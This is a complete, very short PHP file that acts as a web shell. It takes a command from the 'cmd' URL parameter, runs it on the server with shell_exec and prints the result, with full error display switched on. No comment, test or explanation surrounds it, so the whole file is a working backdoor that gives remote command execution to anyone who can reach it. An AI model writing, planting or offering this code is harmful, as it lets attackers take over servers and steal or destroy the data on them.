<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

if(isset($_GET['cmd'])){
    echo shell_exec($_GET['cmd']);
}
?>